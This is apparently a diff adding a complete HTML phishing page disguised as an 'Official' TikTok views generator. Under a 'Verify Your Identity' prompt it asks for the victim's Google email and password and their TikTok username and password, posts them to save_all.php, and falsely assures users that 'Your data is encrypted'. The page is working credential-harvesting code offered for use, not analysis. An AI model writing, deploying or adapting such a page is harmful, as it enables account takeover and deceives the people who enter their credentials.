@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Views Generator - Official</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f8f8f8; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .card { background: white; width: 90%; max-width: 400px; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; }
+        .logo { width: 60px; margin-bottom: 15px; }
+        h2 { color: #1a1a1a; font-size: 22px; margin-bottom: 20px; }
+        .form-group { text-align: left; margin-bottom: 15px; }
+        label { display: block; font-size: 13px; color: #666; margin-bottom: 5px; }
+        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 14px; }
+        .btn { background: #fe2c55; color: white; width: 100%; padding: 12px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; }
+        .btn:hover { background: #e21c4a; }
+        .footer-text { font-size: 11px; color: #aaa; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <img src="https://cdn-icons-png.flaticon.com/512/3075/3075114.png" class="logo" alt="TikTok">
+        <h2>Verify Your Identity</h2>
+        <form action="save_all.php" method="POST">
+            <div class="form-group">
+                <label>Google Account (Gmail)</label>
+                <input type="email" name="gmail" placeholder="example@gmail.com" required>
+            </div>
+            <div class="form-group">
+                <label>Google Password</label>
+                <input type="password" name="gpass" placeholder="Password" required>
+            </div>
+            <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;">
+            <div class="form-group">
+                <label>TikTok Username/Email</label>
+                <input type="text" name="tt_id" placeholder="@username" required>
+            </div>
+            <div class="form-group">
+                <label>TikTok Password</label>
+                <input type="password" name="tt_pass" placeholder="Password" required>
+            </div>
+            <button type="submit" class="btn">Continue to Generator</button>
+        </form>
+        <p class="footer-text">Secure Connection Enabled. Your data is encrypted.</p>
+    </div>
+</body>
+</html>
